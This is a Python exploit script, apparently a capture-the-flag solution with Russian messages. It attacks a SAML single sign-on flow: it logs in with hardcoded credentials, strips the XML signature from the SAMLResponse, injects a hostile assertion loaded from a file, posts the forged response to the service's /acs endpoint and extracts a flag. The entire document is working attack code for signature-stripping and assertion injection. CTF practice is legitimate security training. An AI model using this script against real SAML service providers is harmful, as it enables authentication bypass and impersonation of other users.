#!/usr/bin/env python3

import requests
import sys
import base64
import re

def read_evil_assertion(filepath="evil_assertion.xml"):
    """Загружает вредоносный Assertion из XML-файла."""
    with open(filepath, "r") as f:
        return f.read().strip()

def fetch_original_saml_response(session, ip, port):
    session.get(f"http://{ip}:{port}/login", allow_redirects=True)

    login_resp = session.post(
        f"http://{ip}:{int(port)+1}/sso/login",
        data={"username": "Zaharov", "password": "Zah@rovSAML"},
        allow_redirects=True
    )

    html = login_resp.text
    match = re.search(r'name="SAMLResponse"\s+value="([^"]+)"', html)
    if not match:
        raise Exception("Не удалось извлечь SAMLResponse")

    return base64.b64decode(match.group(1)).decode()

def inject_evil_assertion(original_response, evil_assertion):
    response_wo_signature = re.sub(
        r"<ds:Signature.*?>.*?</ds:Signature>",
        "",
        original_response,
        flags=re.DOTALL,
        count=1
    )

    modified_response = re.sub(
        r'(<saml:Assertion\b)',
        f'{evil_assertion}\\1',
        response_wo_signature
    )

    return base64.b64encode(modified_response.encode()).decode()

def send_modified_response(session, ip, port, new_response):
    response = session.post(
        f"http://{ip}:{port}/acs",
        data={
            "SAMLResponse": new_response,
            "RelayState": "/collective"
        },
        allow_redirects=True
    )
    return response.text

def extract_flag(html):
    match = re.search(r"vka\{.+?}", html)
    return match.group(0) if match else None

def main(ip, port):
    s = requests.Session()
    evil_assertion = read_evil_assertion()

    try:
        original_response = fetch_original_saml_response(s, ip, port)
        new_response = inject_evil_assertion(original_response, evil_assertion)
        result_html = send_modified_response(s, ip, port, new_response)
        flag = extract_flag(result_html)

        if flag:
            print(f"[+] Флаг найден: {flag}")
        else:
            print("[-] Флаг не найден.")

    except Exception as e:
        print(f"[!] Ошибка: {e}")

if __name__ == "__main__":
    ip = "localhost"  
    port = 5000
    if len(sys.argv) == 2:
        ip = sys.argv[1]
    elif len(sys.argv) > 2:
        print(f"Usage: python {sys.argv[0]} [IP]")
        sys.exit(1)

    main(ip, port)
